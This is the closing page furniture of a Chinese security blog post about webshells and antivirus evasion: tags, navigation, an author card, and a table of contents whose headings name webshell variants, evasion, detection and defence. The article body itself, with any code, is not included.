+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">m0nk3y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hack-for.fun/c739.html">https://hack-for.fun/c739.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/webshell/">webshell</a><a class="post-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a></div><div class="post_share"><div class="social-share" data-image="/null" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/f197.html"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">红日安全代码审计项目(一)</div></div></a></div><div class="next-post pull-right"><a href="/f8b2.html"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">一篇文章深入学习PHP反序列化漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a target="_blank" rel="noopener" href="//6910.html" title=""><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-25</div><div class="title"></div></div></a></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/null" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">m0nk3y</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">97</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">81</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">22</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFwebshell"><span class="toc-number">1.</span> <span class="toc-text">什么是webshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#webshell-%E5%88%86%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text">webshell 分类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.1.</span> <span class="toc-text">一句话木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%8F%98%E5%BD%A2"><span class="toc-number">2.1.1.</span> <span class="toc-text">一句话木马变形</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-GPC"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">利用 $GPC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E6%9B%BF%E6%8D%A2"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">关键字替换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">特殊字符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%87%BD%E6%95%B0%E5%8F%98%E5%BD%A2"><span class="toc-number">2.1.1.4.</span> <span class="toc-text">利用函数变形</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8php-%E5%BC%B1%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.1.1.5.</span> <span class="toc-text">利用php 弱类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.1.2.</span> <span class="toc-text">制作一句话木马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E9%A9%AC"><span class="toc-number">2.2.</span> <span class="toc-text">小马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E9%A9%AC"><span class="toc-number">2.3.</span> <span class="toc-text">大马</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E6%9D%80%E6%8A%80%E6%9C%AF"><span class="toc-number">3.</span> <span class="toc-text">查杀技术</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF"><span class="toc-number">4.</span> <span class="toc-text">免杀技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E9%A9%AC%E5%85%8D%E6%9D%80"><span class="toc-number">4.1.</span> <span class="toc-text">小马免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E9%A9%AC%E5%85%8D%E6%9D%80"><span class="toc-number">4.2.</span> <span class="toc-text">大马免杀</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#webshell-%E6%A3%80%E6%B5%8B%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">webshell 检测与绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">6.</span> <span class="toc-text">防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">7.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2986.html" title="Recent arrangements"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Recent arrangements"/></a><div class="content"><a class="title" href="/2986.html" title="Recent arrangements">Recent arrangements</a><time datetime="2099-11-01T04:00:00.000Z" title="Created 2099-11-01 12:00:00">2099-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/9b1d.html" title="No title"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="No title"/></a><div class="content"><a class="title" href="/9b1d.html" title="No title">No title</a><time datetime="2099-10-31T16:00:00.000Z" title="Created 2099-11-01 00:00:00">2099-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/62d1.html" title="Chrome 浏览器扩展开发初试"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Chrome 浏览器扩展开发初试"/></a><div class="content"><a class="title" href="/62d1.html" title="Chrome 浏览器扩展开发初试">Chrome 浏览器扩展开发初试</a><time datetime="2020-11-07T05:04:25.000Z" title="Created 2020-11-07 13:04:25">2020-11-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/558a.html" title="Cobalt Strike"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cobalt Strike"/></a><div class="content"><a class="title" href="/558a.html" title="Cobalt Strike">Cobalt Strike</a><time datetime="2020-11-04T13:33:44.000Z" title="Created 2020-11-04 21:33:44">2020-11-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/abc8.html" title="2020小组招新有感"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2020小组招新有感"/></a><div class="content"><a class="title" href="/abc8.html" title="2020小组招新有感">2020小组招新有感</a><time datetime="2020-10-23T16:56:04.000Z" title="Created 2020-10-24 00:56:04">2020-10-24</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 By m0nk3y</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
